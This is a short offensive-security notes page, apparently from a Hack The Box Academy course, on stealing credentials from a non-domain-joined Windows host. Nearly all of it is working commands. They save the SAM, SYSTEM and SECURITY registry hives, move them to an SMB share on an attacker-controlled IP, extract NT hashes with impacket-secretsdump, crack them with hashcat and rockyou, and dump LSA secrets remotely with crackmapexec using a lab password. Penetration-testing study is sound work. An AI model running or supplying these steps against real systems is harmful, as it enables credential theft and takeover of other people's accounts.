for non-domain joined Windows system

# Copying SAM Registry Hives 
do that in command prompt (run as administrator)
```
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
reg save hklm\security C:\security.save
```

Can start a [SMB Download & Upload](4%20Post-Exploitation/Windows%20Post%20Exploitation/File%20Transfer/SMB%20Download%20&%20Upload.md) on our attack host and then use the victim host, connect to the smbserver and upload the hive copies to share 

```
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

use secretsdump.py
```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
leaving the security out still works

there is two hashes that will be generated (lmhash:nthash)
Most modern windows store password as an NT hash. Operating Systems older than Windows Vista & Windows Server systems store the password as LM hash. 

we put all the hashes tgt in one txt file 

```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

# Dumping LSA secrets remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
sam 
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```